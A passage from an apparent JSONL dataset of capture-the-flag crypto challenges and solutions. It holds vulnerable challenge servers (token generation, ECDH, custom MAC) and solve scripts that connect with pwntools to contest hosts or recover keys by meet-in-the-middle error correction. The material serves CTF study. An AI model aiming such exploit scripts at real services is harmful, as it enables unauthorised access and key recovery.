token is {msg.hex()}.\".encode().decode())\n        else:\n            print(msg.decode())\n\n    else:\n        exit()\n\ndef R0System(USERNAME): \n    global login_tag,PublicChannels\n    option = int(input((b\"Hello \"+ USERNAME + b\",do you need any services? \").decode()))\n    if option == 1:\n        username     = bytes.fromhex(input(b\"Username[HEX]: \".decode())) \n        new_password = bytes.fromhex(input(b\"New Password[HEX]: \".decode()))\n        tag,msg = USER.reset_password(username,new_password)\n        print(msg.decode())\n    elif option == 2:\n        print(b\"Not yet implemented....\") \n\n    elif option == 3:\n        print(PublicChannels.decode())\n    \n    elif option == 4:\n        print((b\"Your private key is:\" + USER.view_private_key(USERNAME).hex().encode()) .decode())\n        print((f\"Your public key is:\".encode() + USER.getsb_public_key(USERNAME).hex().encode()).decode())\n    \n    elif option == 5:\n        login_tag = False\n\ndef Alice_transfer_flag_to_Bob(AliceUsername,BobUsername):\n    global PublicChannels\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" Halo bob, I will give your my flag after we exchange keys.\")\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" OK, I'm ready.\")\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" My Pubclic key is: \" + USER.getsb_public_key(AliceUsername).hex().encode())\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" My Pubclic key is: \" + USER.getsb_public_key(BobUsername).hex().encode())\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,b\" Now its my encrypted flag:\")\n    PublicChannels += transfer_A2B(USER,AliceUsername,BobUsername,   FLAG0 ,enc=True)\n    PublicChannels += transfer_A2B(USER,BobUsername,AliceUsername,b\" Wow! I know your flag now! \")\ntransfer_flag = False\nwhile 1:\n    if not login_tag:\n        print(LOGIN_MENU.decode())\n        USERNAME = LoginSystem(USER) \n    else:\n        if not transfer_flag:\n            Alice_transfer_flag_to_Bob(AliceUsername,BobUsername)\n            transfer_flag = True\n        print(SYSTEM_MENU.decode())\n        R0System(USERNAME)", "name": "server"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r0system\\challenge\\user.py", "category": "crypto", "solution_code": "from utils import transfer_A2B, ECDH, Curve, RandomNG, enc, b2i, i2b, p2b, randint\nimport os\n\nMOD  = 0x100002b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d89024603\nSEED = b2i(os.urandom(48))\n\nclass Users:\n    def __init__(self):\n        self.usernames = set()\n        self.passwords = {}\n        self.tokens = {}\n\n        self.ecdhs = {}\n        self.exchange_keys = {}\n\n        self.RNG = RandomNG(MOD,SEED)\n        self.x = randint(1,MOD)\n\n    def generate_token(self,username):\n        s = self.RNG.next()\n        u = b2i(username)\n        return i2b(int((self.x * pow(s + u,-1,MOD)) % MOD),512)\n\n    def register(self,username,password):\n        if username in self.usernames:\n            return False, b\"Username already exists!\"\n        \n        if len(self.usernames) > 2: \n            return False, b\"Too many accounts!\"\n\n        self.usernames.add(username)\n        self.passwords[username] = password\n\n        token = self.generate_token(username)\n        self.tokens[username] = token\n        ecdh  = ECDH()\n\n        self.ecdhs[username] = ecdh \n\n        return True,token\n\n    def login_by_password(self,username,password):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n\n        check_password = self.passwords[username]\n        if check_password == password:\n            return True, b\"Login successfully!\"\n        else:\n            return False, b\"Password ERROR!\"\n\n    def login_by_token(self,username,token):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n\n        check_token = self.tokens[username]\n        if check_token == token:\n            return True, b\"Login successfully!\"\n        else:\n            return False, b\"Token ERROR!\"\n\n    def reset_password(self,username, new_password):\n        if username not in self.usernames:\n            return False, b\"Username does not exist!\"\n        self.passwords[username] = new_password\n        return True, b\"Reset password successfully!\" \n\n    def view_private_key(self,username):\n        return i2b(self.ecdhs[username].private_key,32)\n\n    def getsb_public_key(self,username):\n        return p2b(self.ecdhs[username].public_key)\n\n    def send_enc_msg_from_A2B(self,A,B,msg):\n        if A < B:\n            if A+B not in self.exchange_keys:\n                ABkey = self.ecdhs[A].exchange_key(self.ecdhs[B].public_key)\n                self.exchange_keys[A+B] = ABkey\n            else:\n                ABkey = self.exchange_keys[A+B]\n        else:\n            if B+A not in self.exchange_keys:\n                ABkey = self.ecdhs[A].exchange_key(self.ecdhs[B].public_key)\n                self.exchange_keys[B+A] = ABkey\n            else:\n                ABkey = self.exchange_keys[B+A]\n\n        return enc(msg,ABkey)\n", "name": "user"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r0system\\challenge\\utils.py", "category": "crypto", "solution_code": "from random import randint\nfrom hashlib import md5\nfrom Crypto.Cipher import AES\n\ndef pad(msg):\n    return msg + bytes([i for i in range(16 - int(len(msg) % 16))])\n\ndef i2b(i,l):\n    return int.to_bytes(i,length=l,byteorder='big')\n\ndef b2i(b):\n    return int.from_bytes(b,byteorder='big')\n\ndef p2b(P):\n    return i2b(P[0],32) + i2b(P[1],32)\n\ndef b2p(m):\n    return (b2i(m[:32]),b2i(m[32:]))\n\ndef enc(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.encrypt(pad(msg))\n\nclass RandomNG:\n    def __init__(self, mod, seed):\n        self.coeffs = [randint(1,mod) for _ in range(8)]\n        self.mod = mod\n        self.state = seed \n\n    def next(self):\n        old_state = int(self.state)\n        self.state = sum(coeff * self.state**i for i,coeff in enumerate(self.coeffs)) % self.mod\n        return old_state\n\nclass Curve: \n    def __init__(self):\n        # Nist p-256\n        self.p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\n        self.a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc\n        self.b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n        self.G = (0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, \n                  0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)\n        self.n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551\n\n    def add(self,P, Q):\n        if (P == (0, 0)):\n            return Q\n        elif (Q == (0, 0)):\n            return P\n        else: \n            x1, y1 = P\n            x2, y2 = Q\n            if ((x1 == x2) & (y1 == -y2)):\n                return ((0, 0))\n            else:\n                if (P != Q):\n                    l = (y2 - y1) * pow(x2 - x1, -1, self.p)\n                else:\n                    l = (3 * (x1**2) + self.a) * pow(2 * y1, -1, self.p)\n            x3 = ((l**2) - x1 - x2) % self.p\n            y3 = (l * (x1 - x3) - y1) % self.p\n            return x3, y3\n\n    def mul(self, n , P):\n        Q = P\n        R = (0, 0)\n        while (n > 0):\n            if (n % 2 == 1):\n                R = self.add(R, Q)\n            Q = self.add(Q, Q)\n            n = n // 2\n        return R\n\nclass ECDH:\n    def __init__(self):\n        self.curve = Curve()\n        self.private_key = randint(1,self.curve.n)\n        self.public_key  = self.curve.mul(self.private_key, self.curve.G)\n\n    def exchange_key(self,others_publickey):\n        return md5(str(self.curve.mul(self.private_key,others_publickey)).encode()).digest()\n\ndef transfer_A2B(USER,A,B,msg,enc=False):\n    if enc == False:\n        return b'[' + A + b\"] to [\" + B + b\"]:\" + msg+b'\\n'\n    else:\n        return b'[' + A + b\"] to [\" + B + b\"]: \" + USER.send_enc_msg_from_A2B(A,B,msg).hex().encode()+b'\\n'\n", "name": "utils"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r0system\\solve\\exp.py", "category": "crypto", "solution_code": "from pwn import remote, context, log\nimport os\n\n\ndef sing_up(io:remote, uname:bytes, pwd:bytes):\n    io.sendlineafter(b\"Now input your option: \", b'3')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex())\n    io.sendlineafter(b\"Password[HEX]: \", pwd.hex())\n    io.recvuntil(b\"token is \")\n    token = io.recvline().strip().decode()\n    return token  \n\ndef login_by_password(io:remote, uname:bytes, pwd:bytes):\n    io.sendlineafter(b\"Now input your option: \", b'1')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex())\n    io.sendlineafter(b\"Password[HEX]: \", pwd.hex())\n    respone = io.recvline().strip().decode()\n    if respone == \"Login successfully!\":\n        return True, uname\n    return False, uname\n\ndef reset_password(io:remote, uname:bytes, new_pwd:bytes):\n    io.sendlineafter(b\"Hello \", uname + b\",do you need any services? \", b'1')\n    io.sendlineafter(b\"Username[HEX]: \", uname.hex())\n    io.sendlineafter(b\"New Password[HEX]: \", new_pwd.hex())\n    respone = io.recvline().strip().decode()\n    return respone\n\n# ctf2024-entry.r3kapig.com:31569\nio = remote('ctf2024-entry.r3kapig.com', 31569)\n\ncontext.log_level = 'debug'\n\nuname = b'tl2cents'\npwd = b'password_' + os.urandom(8).hex().encode()\ntoken = sing_up(io, uname, pwd)\nlog.info(f\"{uname}'s token: {token}\")\n\nlog_in, uname = login_by_password(io, uname, pwd)\nif log_in:\n    log.info(f\"{uname} login successfully!\")\nelse:\n    log.info(f\"{uname} login failed!\")\n", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\R3CTF\\r0system\\solve\\solve.py", "category": "crypto", "solution_code": "from user import Users\nfrom utils import ECDH, b2p, p2b\nfrom random import randint\nfrom hashlib import md5\nfrom Crypto.Cipher import AES\n\ndef pad(msg):\n    return msg + bytes([i for i in range(16 - int(len(msg) % 16))])\n\ndef enc(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.encrypt(pad(msg))\n\ndef dec(msg,key):\n    aes = AES.new(key,AES.MODE_ECB)\n    return aes.decrypt(msg)\n\nska = int(0xd0c27e65e1bbe24a794c78a40ae0b45209e7bc3f0cb8f49b79ab31797b591dce)\npka = bytes.fromhex(\"8f1d7fd6b5b476f19460afa75104e819bd09780015c04fe61ef503c6ef771ccca279eeee164e992c5504ab496e532cf013170cebf4c55ea78b4cf9f2d55859bd\")\npkb = bytes.fromhex(\"f7a7f4a2ff6cc727571258985385f202a8248997973a1b08ac7adb78dd73755c93edd64d8b9c03cf05494da92af46fa3983ed3f1d8c64c02827f22fd57242713\")\npka = b2p(pka)\npkb = b2p(pkb)\nenc_flag = bytes.fromhex(\"fed3a1657c7c8cc0bf014cd6f54ac24164cdd136d02f642fe4653f36321ba586460019baa401bb633cee8f444d375e28a72ff3ad1f463c29d7a02ba02e675fd2140e82877f8f481c44da50415b61c4524283539265845f61085c6a93802ca07b\")\n\n\necdh_alice = ECDH()\necdh_alice.private_key = ska\necdh_alice.public_key = pka\n\necdh_bob = ECDH()\necdh_bob.public_key = pkb\n\nshared_secret = ecdh_alice.exchange_key(ecdh_bob.public_key)\nprint(shared_secret)\n\nflag = dec(enc_flag, shared_secret)\nprint(flag)\n", "name": "solve"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\spiky_elf\\solve\\correct_msb.py", "category": "crypto", "solution_code": "from sage.all import ZZ\n\ndef count_msb_errors(d, d_bar, nmsb=600):\n    return bin(d ^ d_bar)[2:].zfill(1024)[:nmsb].count('1')\n\nn = 0x639d87bf6a02786607d67741ebde10aa39746dc8ed22b191ff2fefe9c210b3ee2ce68b185dc7f8069e78441bdec1d33e2b342c226b5cde8a49f567ac11a3bcb7ff88eeededdd0d50eb981635920d2380a6b878d327b261821355d65b2ef9f807035a70c77252d09787c2b3dfafdfa4f5c6b39a1c66c5b39fe9d1ee4b36d86d5\ne = 0x10001\nflag = 0x40208a7900b1575431a49690030e4eb8be6269edcd3c7b2d97ae94a6eb744e9c622d81b95ea45b23ee6e0d773e3dd48adc6bb2c7c6423d8fd52eddcc6c0710f607590d5fc57a45883a36ad0d851f84d4bee86ffaf65bc1773f97430080926550dce3666051befa87bacc01d44dd09baa6ae93a85cedde5933f7cbbe2cb56cdd\nd = 0x1a54893799cd9805600cfaee1c8a408813525db268fbc29e7f2a81eb47b64d2dd20dc8be52b6332e375f92a120957042a92a4bd4f5e13ef14e9b398bec330602dc9dbbb63cf3dfe6d33bf95d08306a894b052e005a57cc41673fe866f4f8b2ffb0aa26fc4c51a8f5135e40df2107e0259ddf4c1d9c1eb41b1f702b135c941\n\n# cc = (p - 1)(q-1) / lcm(p-1, q-1)\ncc_max = n // d\nnmsb = 520\n\nfor k in range(1, e):\n    for cc in range(2, cc_max, 2):\n        # ed = k(n - p - q + 1)/cc + 1\n        d_real_msb = (k * n // cc + 1) // e\n        err_num = count_msb_errors(d, d_real_msb, nmsb)\n        if err_num <= 16:\n            err_pos = [i for i, (a, b) in enumerate(zip(bin(d)[2:].zfill(1024)[:nmsb], bin(d_real_msb)[2:].zfill(1024)[:nmsb])) if a != b]\n            print(f\"Found: {d_real_msb = } with {k//cc = }\")\n            print(f\"Found: {err_num =  } in {nmsb} msb bits\")\n            print(f\"Found: {err_pos = } from highest bit to lowest bit\")\n            exit(0)\n\n# Found: d_real_msb = 4514088967547488951649479902515202812774123491743896551436762406242971627370506765191178449599877062466101307468179199203541042200279058948411943214043223303232663400817011215091948406144006044666676764127646300202138127044251756808659462372075867443194976482310771190867332273026020227834408536297872091 with k//cc = 67\n# Found: err_num =  9 in 520 msb bits\n# Found: err_pos = [46, 102, 235, 252, 280, 394, 412, 434, 485] from highest bit to lowest bit", "name": "correct_msb"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\spiky_elf\\solve\\mitm_multi_core.py", "category": "crypto", "solution_code": "# Generated by GPT-4o (rewrite a multi-process version of the above code).\nfrom sage.all import binomial\nfrom itertools import combinations\nfrom tqdm import tqdm\nfrom multiprocessing import Pool, cpu_count\n\nn = 0x639d87bf6a02786607d67741ebde10aa39746dc8ed22b191ff2fefe9c210b3ee2ce68b185dc7f8069e78441bdec1d33e2b342c226b5cde8a49f567ac11a3bcb7ff88eeededdd0d50eb981635920d2380a6b878d327b261821355d65b2ef9f807035a70c77252d09787c2b3dfafdfa4f5c6b39a1c66c5b39fe9d1ee4b36d86d5\ne = 0x10001\nflag = 0x40208a7900b1575431a49690030e4eb8be6269edcd3c7b2d97ae94a6eb744e9c622d81b95ea45b23ee6e0d773e3dd48adc6bb2c7c6423d8fd52eddcc6c0710f607590d5fc57a45883a36ad0d851f84d4bee86ffaf65bc1773f97430080926550dce3666051befa87bacc01d44dd09baa6ae93a85cedde5933f7cbbe2cb56cdd\nd = 0x1a54893799cd9805600cfaee1c8a408813525db268fbc29e7f2a81eb47b64d2dd20dc8be52b6332e375f92a120957042a92a4bd4f5e13ef14e9b398bec330602dc9dbbb63cf3dfe6d33bf95d08306a894b052e005a57cc41673fe866f4f8b2ffb0aa26fc4c51a8f5135e40df2107e0259ddf4c1d9c1eb41b1f702b135c941\nd_real_msb = 4514088967547488951649479902515202812774123491743896551436762406242971627370506765191178449599877062466101307468179199203541042200279058948411943214043223303232663400817011215091948406144006044666676764127646300202138127044251756808659462372075867443194976482310771190867332273026020227834408536297872091\n\nerr_pos = [46, 102, 235, 252, 280, 394, 412, 434, 485]\nunknown_nbit = 1024 - 520\nd_msb = (d_real_msb >> unknown_nbit) << unknown_nbit\nd_lsb = d & ((1 << unknown_nbit) - 1)\n\nenc2 = pow(2, e, n)\ninv_enc2 = pow(enc2, -1, n)\nc  = 2 * pow(enc2, - d_msb, n) % n\nc_inv = pow(c, -1, n)\nenc2_basis = [pow(enc2, 2**i, n) for i in range(unknown_nbit // 2)]\nenc2_inv_basis = [pow(inv_enc2, 2**i, n) for i in range(unknown_nbit // 2)]\n\nsearch_err1 = 3 # build table with 3 errors (may be the msb or lsb, depending on the your implementation)\nsearch_err2 = 4 # search table with 4 errors (may be the msb or lsb, depending on the your implementation)\npos_size = 252  # unknown_nbit // 2\n\nd_l_msb = d_lsb >> (unknown_nbit // 2)\nd_l_lsb = d_lsb & ((1 << (unknown_nbit // 2)) - 1)\nB_initial = c * pow(inv_enc2, d_l_lsb, n) % n\nd_l_lsb_bits = [d_l_lsb >> i & 1 for i in range(unknown_nbit // 2)]\nd_l_msb_bits = [d_l_msb >> i & 1 for i in range(unknown_nbit // 2)]\n\nX = pow(enc2, 2**252, n)\nX_basis = [pow(X, 2**i, n) for i in range(unknown_nbit // 2)]\nX_inv_basis = [pow(pow(X, -1, n), 2**i, n) for i in range(unknown_nbit // 2)]\nA_initial = pow(X, d_l_msb, n)\n\n# def build_table_task(pos1_chunk):\n#     table_chunk = {}\n#     for pos1 in pos1_chunk:\n#         lhs = B_initial\n#         for idx in pos1:\n#             if d_l_lsb_bits[idx] == 1:\n#                 lhs = lhs * enc2_basis[idx] % n\n#             else:\n#                 lhs = lhs * enc2_inv_basis[idx] % n\n#         table_chunk[lhs] = pos1\n#     return table_chunk\n\ndef build_table_task(pos1_chunk):\n    table_chunk = {}\n    for pos1 in pos1_chunk:\n        lhs = A_initial\n        for idx in pos1:\n            if d_l_msb_bits[idx] == 1:\n                lhs = lhs * X_inv_basis[idx] % n\n            else:\n                lhs = lhs * X_basis[idx] % n\n        table_chunk[lhs] = pos1\n    return table_chunk\n\ndef parallel_build_table():\n    bf_space = list(combinations(range(pos_size), search_err1))\n    total_size = binomial(pos_size, search_err1)\n    chunk_size = total_size // cpu_count()\n    chunks = [bf_space[i:i+chunk_size] for i in range(0, len(bf_space), chunk_size)]\n\n    with Pool() as pool:\n        results = list(tqdm(pool.imap(build_table_task, chunks), total=len(chunks)))\n\n    table = {}\n    for chunk in results:\n        table.update(chunk)\n    return table\n\n# def search_table_task(args):\n#     pos2_chunk, table = args\n#     results = []\n#     for pos2 in pos2_chunk:\n#         rhs = A_initial\n#         for idx in pos2:\n#             if d_l_msb_bits[idx] == 1:\n#                 rhs = rhs * X_inv_basis[idx] % n\n#             else:\n#                 rhs = rhs * X_basis[idx] % n\n#         if rhs in table:\n#             print(f\"{pos2 = }\")\n#             print(f\"{table[rhs] = }\")\n#             results.append((table[rhs], pos2))\n#     return results\n\ndef search_table_task(args):\n    pos2_chunk, table = args\n    results = []\n    for pos2 in pos2_chunk:\n        rhs = B_initial\n        for idx in pos2:\n            if d_l_lsb_bits[idx] == 1:\n                rhs = rhs * enc2_basis[idx] % n\n            else:\n                rhs = rhs * enc2_inv_basis[idx] % n\n        if rhs in table:\n            print(f\"{pos2 = }\")\n            print(f\"{table[rhs] = }\")\n            results.append((table[rhs], pos2))\n    return results\n\n\ndef parallel_search_table(table):\n    bf_space = list(combinations(range(pos_size), search_err2))\n    total_size = binomial(pos_size, search_err2)\n    chunk_size = total_size // cpu_count()\n    chunks = [bf_space[i:i + chunk_size] for i in range(0, len(bf_space), chunk_size)]\n\n    with Pool() as pool:\n        # Pass both chunks and the table as arguments\n        results = list(tqdm(pool.i", "name": "mitm_multi_core"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\spiky_elf\\solve\\mitm_single_core.py", "category": "crypto", "solution_code": "from sage.all import ZZ, binomial\nfrom itertools import combinations\nfrom tqdm import tqdm\n\nn = 0x639d87bf6a02786607d67741ebde10aa39746dc8ed22b191ff2fefe9c210b3ee2ce68b185dc7f8069e78441bdec1d33e2b342c226b5cde8a49f567ac11a3bcb7ff88eeededdd0d50eb981635920d2380a6b878d327b261821355d65b2ef9f807035a70c77252d09787c2b3dfafdfa4f5c6b39a1c66c5b39fe9d1ee4b36d86d5\ne = 0x10001\nflag = 0x40208a7900b1575431a49690030e4eb8be6269edcd3c7b2d97ae94a6eb744e9c622d81b95ea45b23ee6e0d773e3dd48adc6bb2c7c6423d8fd52eddcc6c0710f607590d5fc57a45883a36ad0d851f84d4bee86ffaf65bc1773f97430080926550dce3666051befa87bacc01d44dd09baa6ae93a85cedde5933f7cbbe2cb56cdd\nd = 0x1a54893799cd9805600cfaee1c8a408813525db268fbc29e7f2a81eb47b64d2dd20dc8be52b6332e375f92a120957042a92a4bd4f5e13ef14e9b398bec330602dc9dbbb63cf3dfe6d33bf95d08306a894b052e005a57cc41673fe866f4f8b2ffb0aa26fc4c51a8f5135e40df2107e0259ddf4c1d9c1eb41b1f702b135c941\nd_real_msb = 4514088967547488951649479902515202812774123491743896551436762406242971627370506765191178449599877062466101307468179199203541042200279058948411943214043223303232663400817011215091948406144006044666676764127646300202138127044251756808659462372075867443194976482310771190867332273026020227834408536297872091\n\nerr_pos = [46, 102, 235, 252, 280, 394, 412, 434, 485]\nunknown_nbit = 1024 - 520\nd_msb = (d_real_msb >> unknown_nbit) << unknown_nbit\nd_lsb = d & ((1 << unknown_nbit) - 1)\n\nenc2 = pow(2, e, n)\ninv_enc2 = pow(enc2, -1, n)\n# enc2^(d_msb) * enc2^(d_l) = 2\n# c:= enc2^(d_l) = 2 * pow(enc2, -d_msb, n) % n\n# d_l := a*2**252 + b \n# c = enc2 ^ (a*2**252 + b) = (enc2^(2^252))^a * enc2 ^ b\n# c *  * (enc2^-1) ^ b) = (enc2^(2^252))^a\n\nc  = 2 * pow(enc2, - d_msb, n) % n\nX = pow(enc2, 2**252, n)\n\nenc2_basis = [pow(enc2, 2**i, n) for i in range(unknown_nbit // 2)]\nenc2_inv_basis = [pow(inv_enc2, 2**i, n) for i in range(unknown_nbit // 2)]\nX_basis = [pow(X, 2**i, n) for i in range(unknown_nbit // 2)]\nX_inv_basis = [pow(pow(X, -1, n), 2**i, n) for i in range(unknown_nbit // 2)]\n\nd_l_msb = d_lsb >> (unknown_nbit // 2)\nd_l_lsb = d_lsb & ((1 << (unknown_nbit // 2)) - 1)\nd_l_lsb_bits = [d_l_lsb >> i & 1 for i in range(unknown_nbit // 2)]\nd_l_msb_bits = [d_l_msb >> i & 1 for i in range(unknown_nbit // 2)]\n\nB_initial = pow(inv_enc2, d_l_lsb, n) * c % n\nA_initial = pow(X, d_l_msb, n)\n\n# build table\nsearch_err1 = 3\nsearch_err2 = 4\npos_size = 252 # unknown_nbit // 2\nbf_space = combinations(range(pos_size), search_err1) \ntotal_size = binomial(pos_size, search_err1)\ntable = {}\n\nfor pos1 in tqdm(bf_space, total=total_size):\n    lhs = A_initial\n    for idx in pos1:\n        if d_l_msb_bits[idx] == 1:\n            lhs = lhs * X_inv_basis[idx] % n\n        else:\n            lhs = lhs * X_basis[idx] % n\n    table[lhs] = pos1\n\nbf_space = combinations(range(pos_size), search_err2) \ntotal_size = binomial(pos_size, search_err2)\n\nfor pos2 in tqdm(bf_space, total=total_size):\n    rhs = B_initial\n    for idx in pos2:\n        if d_l_lsb_bits[idx] == 1:\n            rhs = rhs * enc2_basis[idx] % n\n        else:\n            rhs = rhs * enc2_inv_basis[idx] % n\n    if rhs in table:\n        pos1 = table[rhs]\n        print(f\"{pos1 = }\")\n        print(f\"{pos2 = }\")\n        break", "name": "mitm_single_core"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\circus\\challenge\\vuln.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nf = 0x1f3267f571be716d65f11ecb21b86d2e9\n\ndef to_bits(bs):\n    return int.from_bytes(bs)\n\ndef from_bits(v):\n    return int.to_bytes(v, 16)\n\ndef red(x):\n    while (l := x.bit_length()) > 128:\n        x ^= f << l - 129\n    return x\n\ndef mul(x, y):\n    z = 0\n    for i in range(x.bit_length()):\n        if (x >> i) & 1:\n            z ^= y << i\n    return red(z)\n\ndef exp(x, n):\n    assert n >= 0\n    if not n:\n        return 1\n    if n % 2:\n        return mul(x, exp(x, n-1))\n    return exp(mul(x, x), n//2)\n\nclass Mac:\n    def __init__(self, key):\n        self.key = key\n\n    def __call__(self, msg):\n        tag = exp(to_bits(self.key + bytes([len(msg)]) + msg), 10)\n        return from_bits(tag)\n\nif __name__ == '__main__':\n    import os, signal\n    signal.alarm(60)\n\n    mac = Mac(os.urandom(32))\n    for _ in range(99):\n        try:\n            inp = input().strip().split(' ')\n        except EOFError:\n            exit()\n        cmd, data = inp[0], bytes.fromhex(inp[1])\n        if cmd == 'solve':\n            break\n        if cmd == 'query':\n            print(mac(data).hex())\n        else:\n            print('bad command')\n    else:\n        print('no more')\n        exit()\n\n    key = bytes.fromhex(inp[1])\n    mac_ = Mac(key)\n    for l in range(256):\n        msg = os.urandom(l)\n        if Mac(key)(msg) != mac(msg):\n            print('wrong key')\n            break\n    else:\n        print(open('flag.txt').read().strip())\n\n", "name": "vuln"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\cccircus\\challenge\\vuln.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nf = 0x1f3267f571be716d65f11ecb21b86d2e9\n\ndef to_bits(bs):\n    return int.from_bytes(bs)\n\ndef from_bits(v):\n    return int.to_bytes(v, 16)\n\ndef red(x):\n    while (l := x.bit_length()) > 128:\n        x ^= f << l - 129\n    return x\n\ndef mul(x, y):\n    z = 0\n    for i in range(x.bit_length()):\n        if (x >> i) & 1:\n            z ^= y << i\n    return red(z)\n\ndef exp(x, n):\n    assert n >= 0\n    if not n:\n        return 1\n    if n % 2:\n        return mul(x, exp(x, n-1))\n    return exp(mul(x, x), n//2)\n\nclass Mac:\n    def __init__(self, key):\n        self.key = key\n\n    def __call__(self, msg):\n        tag = exp(to_bits(self.key + bytes([len(msg)]) + msg), 1000000)\n        return from_bits(tag)\n\nif __name__ == '__main__':\n    import os, signal\n    signal.alarm(60)\n\n    mac = Mac(os.urandom(32))\n    for _ in range(99):\n        try:\n            inp = input().strip().split(' ')\n        except EOFError:\n            exit()\n        cmd, data = inp[0], bytes.fromhex(inp[1])\n        if cmd == 'solve':\n            break\n        if cmd == 'query':\n            print(mac(data).hex())\n        else:\n            print('bad command')\n    else:\n        print('no more')\n        exit()\n\n    key = bytes.fromhex(inp[1])\n    mac_ = Mac(key)\n    for l in range(256):\n        msg = os.urandom(l)\n        if Mac(key)(msg) != mac(msg):\n            print('wrong key')\n            break\n    else:\n        print(open('flag.txt').read().strip())\n\n", "name": "vuln"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\cccccircus\\challenge\\vuln.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\n\nf = 0x1f3267f571be716d65f11ecb21b86d2e9\n\ndef to_bits(bs):\n    return int.from_bytes(bs)\n\ndef from_bits(v):\n    return int.to_bytes(v, 8)\n\ndef red(x):\n    while (l := x.bit_length()) > 128:\n        x ^= f << l - 129\n    return x\n\ndef mul(x, y):\n    z = 0\n    for i in range(x.bit_length()):\n        if (x >> i) & 1:\n            z ^= y << i\n    return red(z)\n\ndef exp(x, n):\n    assert n >= 0\n    if not n:\n        return 1\n    if n % 2:\n        return mul(x, exp(x, n-1))\n    return exp(mul(x, x), n//2)\n\nclass Mac:\n    def __init__(self, key):\n        self.key = key\n\n    def __call__(self, msg):\n        tag = exp(to_bits(self.key + bytes([len(msg)]) + msg), 1000000)\n        return from_bits(tag >> 64)\n\nif __name__ == '__main__':\n    import os, signal\n    signal.alarm(60)\n\n    mac = Mac(os.urandom(32))\n    for _ in range(99):\n        try:\n            inp = input().strip().split(' ')\n        except EOFError:\n            exit()\n        cmd, data = inp[0], bytes.fromhex(inp[1])\n        if cmd == 'solve':\n            break\n        if cmd == 'query':\n            print(mac(data).hex())\n        else:\n            print('bad command')\n    else:\n        print('no more')\n        exit()\n\n    key = bytes.fromhex(inp[1])\n    mac_ = Mac(key)\n    for l in range(256):\n        msg = os.urandom(l)\n        if Mac(key)(msg) != mac(msg):\n            print('wrong key')\n            break\n    else:\n        print(open('flag.txt').read().strip())\n\n", "name": "vuln"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HXP\\cccccircus\\solve\\exp.py", "category": "crypto", "solution_code": "from sage.all import GF, PolynomialRing, ZZ, matrix, vector\nfrom pwn import remote, process\n\nP = PolynomialRing(GF(2), 'x')\nx = P.gen()\n\ndef int_to_poly(h):\n    return sum(((int(h) >> i) & 1) * x**i for i in range(int(h).bit_length()))\n\ndef poly_to_hex(f):\n    num = int(\"\".join([str(i) for i in f.list()[::-1]]), 2)\n    return num.to_bytes((num.bit_length() + 7) // 8, \"big\").hex()\n\nf = int_to_poly(0x1f3267f571be716d65f11ecb21b86d2e9)\nF = GF(2**128, name='a', modulus=f)\na = F.gen()\n\ndef generate_special_message(target_len):\n    assert 255 >= target_len >= 16\n    prefix = bytes([target_len]) + b\"\\x00\" * target_len\n    pre_poly = F(int_to_poly(int.from_bytes(prefix, \"big\")))\n    suffix16 = bytes.fromhex(poly_to_hex(-pre_poly))\n    suffix = b\"\\x00\" * (target_len - len(suffix16)) + suffix16\n    return bytes([target_len]) +  suffix\n\n\ndef polynomial_to_circulant_matrix(poly, n, mod, F=GF(2)):\n    x = poly.variables()[0]\n    M = []\n    for i in range(n):\n        tmp_pol = poly * x**i % mod\n        M.append(tmp_pol.list() + [0] * (n - 1 - tmp_pol.degree()))\n    return matrix(F, M)\n\nlocal = False\nwhile True:\n    if local:\n        io = process([\"python3\", \"vuln.py\"], level='info')\n    else:\n        io = remote(\"78.46.142.212\", \"7777\", level='info')\n    eqs = []\n    leaks = []\n    for tlen in range(32, 32 + 10):\n        io.sendline(b\"query \" + 